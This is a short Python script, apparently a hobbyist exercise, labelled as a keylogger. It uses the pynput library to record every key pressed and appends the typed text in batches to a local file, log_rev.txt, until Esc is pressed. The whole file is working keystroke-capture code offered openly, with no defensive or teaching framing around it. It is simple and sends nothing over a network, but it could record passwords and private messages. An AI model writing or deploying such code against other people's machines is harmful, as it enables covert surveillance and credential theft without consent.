"""
KeyLogger @author: Stalin
To do this code is necessary use pynput module
to get it module, yau have to use pyp install pynput
"""
import pynput

from pynput.keyboard import Key, Listener

count=0
keys=[]


def on_press(key):          #Function to detect key that was pressed
    global keys, count
    
    keys.append(key)
    count +=1
    
    print("{0} pressed".format(key))
    
    if (count>=10):
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open("log_rev.txt","a") as f:
        for key in  keys:
            k = str(key).replace("'","")
            if k.find("space")>0:
                #f.write(str(key))
                f.write('\n')
            elif k.find("Key")== -1:
                f.write(k)

    
def on_release(key):        #Function to release(lanzar) program
    if (key==Key.esc): 
        return False
        
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
    

    
    
     
    
    
    